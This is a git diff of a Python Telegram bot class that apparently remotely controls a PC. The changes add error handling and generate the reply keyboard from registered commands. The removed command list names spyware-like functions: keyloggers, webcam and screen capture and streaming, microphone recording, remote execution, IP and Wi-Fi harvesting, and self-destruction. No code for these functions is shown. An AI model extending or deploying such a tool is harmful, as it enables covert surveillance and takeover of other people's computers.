@@ -1244,7 +1244,10 @@ class PeppinoTelegram:
         self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")
 
     def delete_message(self, message_id: int) -> None:
-        self.bot.deleteMessage((self.owner_id, message_id))
+        try:
+            self.bot.deleteMessage((self.owner_id, message_id))
+        except TelegramError:
+            ...
 
     def deletemessages(self, number: int = 1) -> None:
         message_ids = self.all_session_messages[-number:]
@@ -1666,39 +1669,8 @@ class PeppinoTelegram:
         self.__play_loaded_sound("pss")
 
     def quickmenu(self) -> int:
-        keyboard = [
-        ["/shutdown", "/selfdestruction"],
-        ["/altf4", "/clear"],
-        ["/fakeshutdown"],
-        ["/getip", "/wifiinfo"],
-        ["/selfie", "/screenshot"],
-        ["/webcamclip", "/screenclip"],
-        ["/fullclip", "/recordjum"],
-        ["/waitforface", "/displaymode"],
-        ["/webcamstreamstart", "/screenstreamstart"],
-        ["/webcamstreamstop", "/screenstreamstop"],
-        ["/microphone", "/mutevolume"],
-        ["/fullvolume", "/setvolume"],
-        ["/getvolume", "/tralalerotralala"],
-        ["/mixermenu"],
-        ["/jumpscare", "/jumpscarenoaudio"],
-        ["/invertedscreen", "/distortedscreen"],
-        ["/messagebox", "/messagespam"],
-        ["/camerawallpaper", "/setvideowallpaper"],
-        ["/execute", "/processkiller"],
-        ["/terminateprocess", "/procmonmenu"],
-        ["/procmonadd", "/procmonrem"],
-        ["/randomkeyboard", "/capslock"],
-        ["/mousecontroller", "/mouselock"],
-        ["/bsend", "/id"],
-        ["/cantopenadd", "/cantopenremove"],
-        ["/cantopenmenu"],
-        ["/keylogger", "/livekeylogger"],
-        ["/plankton", "/johnpork"],
-        ["/gabinetti"],
-        ["/duckyscript", "/duckyhelp"],
-        ["/help"]
-        ]
+        commands = list(map(lambda x: f"/{x['command']}", self.commands))
+        keyboard = [commands[i:i + 2] for i in range(0, len(commands), 2)]        
         return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)
 
     def randomkeyboard(self, timeout: int =5) -> None:
@@ -2068,7 +2040,7 @@ class PeppinoTelegram:
         self.images = load_images()
         self.update_commands()
         nomemes = list(self.images.copy().keys())
-        self.nomemes = filter(lambda x: x.startswith("jmp"), nomemes)
+        self.nomemes = list(filter(lambda x: x.startswith("jmp"), nomemes))
         self.audios = load_audios()
         self.backup_wallpaper_path = join(BURN_DIRECTORY, get_current_wallpaper())
 
@@ -2103,9 +2075,9 @@ class PeppinoTelegram:
         sys.exit()
 
     def update_commands(self) -> bool:
-        commands = self.extract_commands()
+        self.commands = self.extract_commands()
         url = f'https://api.telegram.org/bot{self.token}/setMyCommands'
-        payload = {'commands': commands}
+        payload = {'commands': self.commands}
         response = requests.post(url, json=payload)
         return response.status_code == 200
 
